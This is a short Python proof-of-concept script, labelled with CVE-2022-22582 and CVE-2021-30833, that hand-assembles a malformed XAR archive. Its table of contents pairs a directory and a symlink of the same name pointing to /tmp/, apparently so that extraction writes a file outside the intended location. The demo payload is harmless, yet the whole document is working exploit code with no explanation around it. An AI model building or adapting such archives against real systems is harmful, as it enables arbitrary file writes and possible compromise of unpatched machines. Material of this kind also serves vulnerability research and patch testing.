import zlib
import hashlib

#### CVE-2022-22582
#### CVE-2021-30833

magic = 'xar!'.encode()
size = int.to_bytes(28,2,'big')
version = int.to_bytes(28,2,'big')

mydata = b'1111111'

datahash=str(hashlib.sha1(mydata).hexdigest())
datalength=str(len(mydata))

fnm='testing.sh'


xmlxx = f'''<?xml version="1.0" encoding="UTF-8"?>
    <xar>
     <toc>
      <checksum style="sha1">
       <offset>0</offset>
       <size>20</size>
      </checksum>
      <file id="1">
        <name>.x</name>
      <type>directory</type>
      <file id="2">
      <name>{fnm}</name>
      <type>file</type>
        <data>
        <archived-checksum style="sha1">{datahash}</archived-checksum>
        <extracted-checksum style="sha1">{datahash}</extracted-checksum>
         <size>{datalength}</size>
         <offset>20</offset>
         <encoding style="application/octet-stream"/>
         <length>{datalength}</length>
        </data>
        </file>
       </file>
       <file id="3">
         <name>.x</name>
         <type>symlink</type>
       <link type="directory">/tmp/</link>
       </file>
     </toc>
    </xar>'''

compressed = zlib.compress(xmlxx.encode('utf-8'), 9)

h = hashlib.sha1(compressed).digest()


toc_length_compressed = int.to_bytes(len(compressed),8,'big')

toc_length_uncompressed = int.to_bytes(len(xmlxx.encode('utf-8')),8,'big')

chcksum_alg = int.to_bytes(1,4,'big')

heapcontent = h+mydata

mymodifiedxar = b''
mymodifiedxar += magic
mymodifiedxar += size
mymodifiedxar += version
mymodifiedxar += toc_length_compressed
mymodifiedxar += toc_length_uncompressed
mymodifiedxar += chcksum_alg
mymodifiedxar += compressed
mymodifiedxar += heapcontent


